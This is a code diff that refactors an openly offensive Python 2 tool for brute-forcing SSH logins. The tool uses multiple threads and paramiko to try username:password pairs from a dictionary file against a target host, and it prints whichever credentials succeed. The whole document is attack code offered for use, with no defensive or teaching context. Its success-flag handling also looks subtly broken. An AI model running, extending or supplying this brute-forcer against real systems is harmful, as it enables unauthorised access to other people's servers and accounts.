@@ -16,6 +16,9 @@
                 
                 1. Enter the command you wish to execute on remote system as a user cmdline arg
                 2. Move the config file elsewhere for easy edit, and import it in this script for usage
+                3. Make this script more object oriented with tasks_setup and all its related function calls 
+                    encapsulated in custom class, and its methods.
+
 
 """
 
@@ -53,11 +56,10 @@ class BruteForce_Worker(threading.Thread):                                  # cu
         
     """
     
-    def __init__(self, ssh, queue, threadnumber, targetIP):
+    def __init__(self, queue, threadnumber, targetIP):
         """
             Args:
                 self (object): The self object, provides a way to refer to self attributes
-                ssh (object): The paramiko ssh instance
                 queue (object): A queue to be working with by this specific thread worker (FIFO)
                 threadnumber (int): The identifying number of each thread
 
@@ -66,10 +68,11 @@ class BruteForce_Worker(threading.Thread):                                  # cu
     
         """
         threading.Thread.__init__(self)                                     # initializing from original thread class
-        self.ssh = ssh                                                      # assigning the existing ssh instance
+        self.ssh = ssh_client_setup()                                                      # assigning the existing ssh instance
         self.queue = queue                                                  # assigning queue
         self.threadnumber = threadnumber                                    # assigning this particular thread its thread number, for ID
         self.targetIP = targetIP                                            # assigning target host IP
+        print '[!] Thread %i is initiated, and ready to work!' %self.threadnumber
 
 #................................................................................................................................................#
 
@@ -86,19 +89,19 @@ class BruteForce_Worker(threading.Thread):                                  # cu
 
         """
         global __SUCCESS__                                                  # we will utitlize the global success check for each queue job
-        print '+' * 100         
-        print '[+] Thread ' + str(self.threadnumber) + ' is doing work'     # print to standard output 
-        
-        ssh_instance = self.ssh
         
         while True:                                                         # this will check the success flag, if not true as of yet: 
             if not __SUCCESS__: 
                 line = self.queue.get()                                     # getting each queue task
                 user_pass = line.strip().split(':')                         # splitting it into a list format for [username, password]
-                bruteforce(ssh_instance, self.targetIP, user_pass)          # passing all parameters to bruteforce function
+                bruteforce(self.ssh, self.targetIP, user_pass, self.threadnumber)          
+                                                                            # passing all parameters to bruteforce function
                 self.queue.task_done()                                      # upon completion, we will call task_done()
             else:                                                           # if success flag is toggled true by bruteforce function
                 close_queue(self.queue)                                     # passing this entire queue to queue closing procedures
+                self.ssh.close()                                            # closing ssh connection
+                print '[!] Thread %i finished, exiting...' % self.threadnumber
+                break
                 
 
 ##################################################################################################################################################
@@ -179,12 +182,8 @@ def main(host, file_path):
     """
     global __CONFIG__
     
-    ssh_instance = ssh_client_setup()                                                   # starting ssh instance from paramiko
-    
-    
-    tasks_init(ssh_instance, host, file_path, __CONFIG__['num_of_attempts_per_thread']) # we need to open up file and count up tasks with this
+    tasks_setup(host, file_path, __CONFIG__['num_of_attempts_per_thread'])              # we need to open up file and set up tasks with this
 
-    ssh_instance.close()                                                                # closing ssh instance from paramiko
 
     print '[!] Exiting...'
 
@@ -206,10 +205,9 @@ def ssh_client_setup():
 
 #------------------------------------------------------------------------------------------------------------------------------------------------#
 
-def tasks_init(ssh, host, filePath, num_of_attempts_per_thread):
+def tasks_setup(host, filePath, num_of_attempts_per_thread):
     """
         Args:
-            ssh (object): the ssh instance to do each task
             host (string): the host ip to attack
             filePath (string): the dictionary file path to use for each bruteforce attempt
             num_of_attempts_per_thread (int): how many jobs in each queue for each thread to work
@@ -224,19 +222,24 @@ def tasks_init(ssh, host, filePath, num_of_attempts_per_thread):
     fd = open(filePath, 'r')                                    # open up file to read
     lines = fd.readlines()                                      # returns a list format of each line per element
     format_checker(lines)                                       # issuing check on each line's format
+    threads = []                                                # initialzing for threads to live
 
     if len(lines) < (num_of_attempts_per_thread * 4):
-        num_of_threads = 1                                          # thread count
-        queues = queue_setup(num_of_threads, lines)                 # setting up queue tasks
-        t = thread_factory(ssh, queues[queues.keys()[0]], 1, host)  # setting up threads to work
-        queues[queues.keys()[0]].join()                             # make sure this will block until all tasks are done
+        num_of_threads = 1                                                              # thread count
+        queues = queue_setup(num_of_threads, lines)                                     # setting up queue tasks
+        t = thread_factory(queues[queues.keys()[0]], 1, host)                           # setting up threads to work
+        threads.append(t)                                                               # pushing it into our threads list
 
-    else:                                                           # same thing goes for 4 queue scenario
+    else:                                                                               # same thing goes for 4 queue scenario
         num_of_threads = 4
         queues = queue_setup(num_of_threads, lines)
         for queue_name in queues:
-            t = thread_factory(ssh, queues[queue_name], int(queue_name[10]), host)        # tenth element is the thread number
-            queues[queue_name].join()
+            t = thread_factory(queues[queue_name], int(queue_name[10]), host)           # tenth element is the thread number
+            threads.append(t)                                                           # pushing all threads into the list
+
+    
+    for thread in threads:                                                              # joining the main method until all threads are done
+        thread.join()
 
 #------------------------------------------------------------------------------------------------------------------------------------------------#
 
@@ -322,10 +325,9 @@ def jobadder(queue_obj, num, lines):
 
 #-----------------------------------------------------------------------------------------------------------------------------------------------#
             
-def thread_factory(ssh, queue, threadnumber, host):
+def thread_factory(queue, threadnumber, host):
     """
         Args:
-            ssh (object): ssh instance to be passed in to each thread to work with
             queue (object): each of the queue to be passed in for each thread to work with
             threadnumber (int): threadnumber for thread identification
             host (string): host ip to be passed in to each thread to attack
@@ -337,9 +339,9 @@ def thread_factory(ssh, queue, threadnumber, host):
     
     """
     
-    slave_thread = BruteForce_Worker(ssh, queue, threadnumber, host)                    # invoking BruteForce_Worker thread class
-    slave_thread.setDaemon(True)                                                        # making sure this thread is a daemon
-    slave_thread.start()                                                                # starting the thread
+    slave_thread = BruteForce_Worker(queue, threadnumber, host)                 # invoking BruteForce_Worker thread class
+    slave_thread.setDaemon(True)                                                # making sure this thread is a daemon
+    slave_thread.start()                                                        # starting the thread
 
     return slave_thread         # returning to task_init to have its queue to be joined until all tasks are done and the new thread gets created
 
@@ -363,12 +365,13 @@ def close_queue(queue):
 
 #------------------------------------------------------------------------------------------------------------------------------------------------#
 
-def bruteforce(ssh, host, user_pass):
+def bruteforce(ssh, host, user_pass, thread_id):
     """
         Args:
             ssh (object): ssh instance that we are working with
             host (string): host ip to attack
             user_pass (list): [username, password] format string to be used for bruteforce
+            thread_id (int): the current thread ID calling bruteforce performing tasks
         
         Returns:
             Effect: Will try to connect with ssh instance and the input host, username and password
@@ -381,11 +384,11 @@ def bruteforce(ssh, host, user_pass):
 
     # assumming the user-pass file is of the form  username:password\n
     try: 
-        print '[+] Trying to login using username: %s and password = %s' %(user_pass[0], user_pass[1])              # try to connect
+        print '[+] Thread %i: Trying to login using username: %s and password = %s' %(thread_id, user_pass[0], user_pass[1])
         ssh.connect(host, username=user_pass[0], password=user_pass[1], banner_timeout=60, auth_timeout=60)         # using connect method
 
     except Exception as e:                                                                                          # if failed, print e 
-        print '[-] Bruteforce Attempt failed because of exception: ', e
+        print '[-] Thread ' + str(thread_id) + ': Bruteforce Attempt failed because of exception: ', e
     else:
         __SUCCESS__ = True                                                                                          # if success, toggle true
         print '[+] Successfully logged in using username: %s, and password: %s' %(user_pass[0], user_pass[1])       # print to stdo
